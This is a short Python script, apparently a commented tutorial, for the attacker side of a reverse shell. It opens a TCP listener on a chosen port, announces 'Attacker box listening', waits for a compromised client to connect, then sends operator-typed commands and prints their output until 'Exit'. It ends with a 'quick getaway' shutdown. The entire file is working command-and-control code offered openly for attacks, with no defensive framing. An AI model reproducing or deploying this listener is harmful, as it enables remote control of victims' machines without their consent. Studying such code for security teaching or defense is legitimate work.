# Code for TCP server for reverse shell client

import sys
from socket import *

server_port = int(sys.argv[1])

#A TCP Socket (SOCK_STREAM) for IPv4 protocol (AF_INET)
server_socket = socket(AF_INET, SOCK_STREAM)

# Asking OS to reuse the socket that we recently used, this makes socket robust
server_socket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)

# Now binding the socket with a port, this takes two arguments, ip address and port
# we are using a tuple to pass these argunemts
# Since we are leaving the ip address argument empty, this will take system's default IP address
server_socket.bind(('', server_port))

# Now that the socket is bind, this will start listening for connections
# Here we specify number of connection we want to support, if we have multiple clients connecting then we need to increase the value
server_socket.listen(1)
print("Attacker box listening and awating instructions")

# Once the client connects to our socket, we will accept the connection and return a connection object
connectionSocket, addr = server_socket.accept()
print("Thanls for connecting to me" + str(addr))

# we will use this connection object to send and receive commands
message = connectionSocket.recv(1024)
print(message)

command = ""
while command != "Exit":
    command = input("Please enter a command: ")
    connectionSocket.send(command.encode())
    message = connectionSocket.recv(1024).decode()
    print(message)

# Once we are done with sending commands we will configure out connection for a quick getaway
connectionSocket.shutdown(SHUT_RDWR)
connectionSocket.close()
